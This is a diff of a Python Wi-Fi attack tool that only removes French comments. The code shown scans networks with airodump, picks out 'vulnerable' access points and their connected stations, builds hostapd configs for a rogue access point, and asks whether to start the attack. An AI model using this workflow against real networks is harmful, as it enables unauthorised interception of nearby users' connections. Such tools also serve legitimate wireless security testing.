@@ -447,42 +447,34 @@ def start_attack(config_file, checker):
 
 def do_stuff(interface, managed_interface, checker):
     
-    # Vérifie si l'utilisateur a les privilèges nécessaires
     check_root()
     check_tools()
     check_interface_exists(interface)
     check_interface_exists(managed_interface)
     check_monitor_mode(interface)
     
-    # Crée un répertoire pour les captures
     folder_name = create_scan_directory()
     
-    # Lance airodump pour scanner les réseaux
     run_airodump(interface, folder_name)
 
-    # Récupère les fichiers PCAP générés
     pcap_files = [f for f in os.listdir(folder_name) if f.startswith('discovery') and (f.endswith('.pcap') or f.endswith('.cap'))]
     all_vulnerable_aps = []
 
-    # Analyse chaque fichier PCAP pour trouver des points d'accès vulnérables
     for pcap_file in pcap_files:
         file_path = os.path.join(folder_name, pcap_file)
         print(f"[+] Parsing PCAP file: {file_path}")
         vulnerable_aps = analyze_pcap(file_path)
         all_vulnerable_aps.extend(vulnerable_aps)
     
-    # Quitte si aucun AP vulnérable n'a été trouvé
     if not all_vulnerable_aps:
         sys.exit(1)
     
-    # Filtre les points d'accès pour éviter les doublons
     unique_aps = list({ap['BSSID']: ap for ap in all_vulnerable_aps}.values())
     
     created_files = []
 
     all_stations = {}
 
-    # Capture les stations et crée les fichiers de configuration pour chaque AP
     for ap in unique_aps:
         capture_stations(interface, ap, folder_name)
         stations = analyze_station_files(folder_name, ap['SSID'])
@@ -504,12 +496,10 @@ def do_stuff(interface, managed_interface, checker):
         else:
             print(f"[!] Skipping hostapd configuration file creation for AP {ap['SSID']} because no stations were found.")
     
-    # Quitte si aucun fichier de configuration valide n'a été créé
     if not created_files:
         print("[!] No valid configuration files created. Exiting program.")
         sys.exit(1)
     
-    # Demande à l'utilisateur s'il souhaite démarrer l'attaque
     while True:
         consent = input("[!] Stations are connected. Would you like to start the attack? (y/n) ").strip().lower()
         
@@ -551,7 +541,6 @@ def main():
     monitor_interface = args.monitor_interface
     managed_interface = args.rogueAP_interface if args.rogueAP_interface else monitor_interface
     
-    # Vérification de la présence des arguments
     if args.monitor_interface and not args.rogueAP_interface:
         # If only one interface provided, checker will be true == passive mode
         checker = True
